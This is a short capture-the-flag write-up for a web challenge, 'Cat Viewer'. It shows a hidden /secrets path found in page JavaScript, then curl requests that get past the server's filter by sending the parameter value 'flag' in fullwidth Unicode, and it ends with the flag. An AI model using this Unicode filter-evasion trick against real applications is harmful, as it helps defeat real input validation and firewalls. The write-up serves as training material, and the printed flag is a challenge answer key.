# Cat Viewer - Web Exploitation

## Ideas
There is a hidden `/secrets` path in the source of `/explore`.

```html
<script>
function isAdmin() {
  let cookie = decodeURIComponent(document.cookie);
  let cookie_values = cookie.split(';');
  for(let i = 0; i <cookie_values.length; i++) {
    let c = cookie_values[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf("admin") == 0) {
      if (c.substring(name.length, c.length).indexOf("true")) { return true; }
    }
  }
  return false;
}
if (isAdmin()){
    document.getElementById("content").innerHTML = '<a href="/secrets">secrets</a>';
}
else {
    document.getElementById("content").innerHTML = '<ul><li><a href="/books">books</a></li><li><a href="/cats">cats</a></li><li><a href="/shopping_list">shopping list</a></li></ul>';
}
</script>
```
This content of `/secrets`:
``` bash
➜ curl https://nessus-badwaf.chals.io/secrets
<html>
<body>

    <h1>🅢🅔🅒🅡🅔🅣🅢</h1>
    <p>I only know one secret, but you gotta know how to ask.</p>
    <!-- Try asking with a "secret_name" post parameter -->
    
</body>
</html>
```
Follow the hint so the response is changed to
```
➜ curl https://nessus-badwaf.chals.io/secrets -d "secret_name="
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

```
Found the value correct of `secret_name` value parameter is `flag`

```
➜ curl https://nessus-badwaf.chals.io/secrets -d "secret_name=flag"
🤐You know what to ask for, but you're not asking correctly.
```

Convert the `flag` to Unicode using https://qaz.wtf/u/convert.cgi to ｆｌａｇ 
```
➜ curl https://nessus-badwaf.chals.io/secrets -d "secret_name=ｆｌａｇ"
flag{h0w_d0es_this_even_w0rk}
```


## Flag
flag{h0w_d0es_this_even_w0rk}
